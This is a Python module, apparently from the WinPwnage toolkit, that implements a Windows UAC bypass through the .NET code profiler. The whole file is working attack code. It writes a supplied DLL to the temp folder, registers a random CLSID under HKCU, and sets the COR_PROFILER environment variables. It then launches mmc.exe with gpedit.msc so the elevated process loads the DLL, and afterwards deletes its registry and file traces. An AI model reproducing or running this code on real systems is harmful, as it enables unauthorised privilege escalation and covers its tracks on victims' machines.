from winpwnage.core.prints import *
from winpwnage.core.utils import *
import tempfile
import uuid
import time

# https://gist.github.com/clavoillotte/f2fba9fa4ba8db14093a62164963d4a9

dotnet_info = {
	"Description": "Bypass UAC using .NET Code Profiler (dll payload)",
	"Id": "18",
	"Type": "UAC bypass",
	"Fixed In": "999999" if not information().uac_level() == 4 else "0",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "dotnet_uacbypass",
	"Function Payload": True,
}
 
guid_array = []

def GenerateGUID():
	""" This function generates a random UUID """
	try:
		guid_array.append(uuid.uuid4())
	except Exception:
		return False
	else:
		return True

def dotnet_uacbypass(payload):
	if payloads().dll(payload):
		try:
			payload_data = open(os.path.join(payload), "rb").read()
		except Exception as error:
			return False

		try:
			dll_file = open(os.path.join(tempfile.gettempdir(), "payload.dll"), "wb")
			dll_file.write(payload_data)
			dll_file.close()
		except Exception as error:
			return False

		if GenerateGUID():
			if "64" in information().architecture():
				path = "Software\\Classes\\WOW6432Node\\CLSID\\{{{guid}}}".format(guid=guid_array[0])
				print_info("Writing CLSID: {path}".format(path=path))
				
				if registry().modify_key(hkey="hkcu", path=path, name=None, value=None, create=True):
					print_success("Created: {path}".format(path=path))
				else:
					print_error("Unable to create: {path}".format(path=path))
			else:
				path = "Software\\Classes\\CLSID\\{{{guid}}}".format(guid=guid_array[0])
				print_info("Writing CLSID: {path}".format(path=path))
				
				if registry().modify_key(hkey="hkcu", path=path, name=None, value=None, create=True):
					print_success("Created: {path}".format(path=path))
				else:
					print_error("Unable to create: {path}".format(path=path))
		else:
			print_error("Unable to generate a random GUID")


		print_info("Creating Environment variables")
		if registry().modify_key(hkey="hkcu", path="Environment", name="COR_ENABLE_PROFILING", value="1", create=True):
			print_success("Created: COR_ENABLE_PROFILING")
		else:
			print_error("Unable to create: COR_ENABLE_PROFILING")
		
		if registry().modify_key(hkey="hkcu", path="Environment", name="COR_PROFILER", value="{{{guid}}}".format(guid=guid_array[0]), create=True):
			print_success("Created: COR_PROFILER")
		else:
			print_error("Unable to create: COR_PROFILER")
			
		if registry().modify_key(hkey="hkcu", path="Environment", name="COR_PROFILER_PATH", value=os.path.join(tempfile.gettempdir(), "payload.dll"), create=True):
			print_success("Created: COR_PROFILER_PATH")
		else:
			print_error("Unable to create: COR_PROFILER_PATH")


		print_info("Setting Environment variables")
		os.environ["COR_ENABLE_PROFILING"] = "1"
		print_success("Successfully: COR_ENABLE_PROFILING = 1")

		os.environ["COR_PROFILER"] = "{{{guid}}}".format(guid=guid_array[0])
		print_success("Successfully: COR_PROFILER = {{{guid}}}".format(guid=guid_array[0]))

		os.environ["COR_PROFILER_PATH"] = os.path.join(tempfile.gettempdir(), "payload.dll")
		print_success("Successfully: COR_PROFILER_PATH = {payload}".format(payload=os.path.join(tempfile.gettempdir(), "payload.dll")))


		if process().create("mmc.exe", params="gpedit.msc", window=True):
			print_success("Created mmc.exe process")
		else:
			print_error("Unable to create mmc.exe process")

		time.sleep(5)


		print_info("Performing clean up")
		if os.path.isfile(os.path.join(tempfile.gettempdir(), "payload.dll")) == True:
			try:
				os.remove(os.path.join(tempfile.gettempdir(), "payload.dll"))
			except Exception as error:
				print_warning("Unable to delete payload from directory, manual cleaning needed!")
			else:
				print_success("Successfully deleted payload from directory")

		if "64" in information().architecture():
			path = "Software\\Classes\\WOW6432Node\\CLSID\\{{{guid}}}".format(guid=guid_array[0])

			if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
				print_success("Deleted CLSID: {path}".format(path=path))
			else:
				print_error("Unable to delete CLSID: {path}".format(path=path))
		else:
			path = "Software\\Classes\\CLSID\\{{{guid}}}".format(guid=guid_array[0])

			if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
				print_success("Deleted CLSID: {path}".format(path=path))
			else:
				print_error("Unable to delete CLSID: {path}".format(path=path))

		if registry().remove_key(hkey="hkcu", path="Environment", name="COR_ENABLE_PROFILING", delete_key=False):
			print_success("Deleted Environment: COR_ENABLE_PROFILING")
		else:
			print_error("Unable to delete: COR_ENABLE_PROFILING")
		
		if registry().remove_key(hkey="hkcu", path="Environment", name="COR_PROFILER", delete_key=False):
			print_success("Deleted Environment: COR_PROFILER")
		else:
			print_error(" Unable to delete: COR_PROFILER")

		if registry().remove_key(hkey="hkcu", path="Environment", name="COR_PROFILER_PATH", delete_key=False):
			print_success("Deleted Environment: COR_PROFILER_PATH")
		else:
			print_error("Unable to delete: COR_PROFILER_PATH")

		del os.environ["COR_ENABLE_PROFILING"]
		print_success("Deleted: COR_ENABLE_PROFILING")

		del os.environ["COR_PROFILER"]
		print_success("Deleted: COR_PROFILER")

		del os.environ["COR_PROFILER_PATH"]
		print_success("Deleted: COR_PROFILER_PATH")
	else:
		print_error("Cannot proceed, invalid payload")
		return False
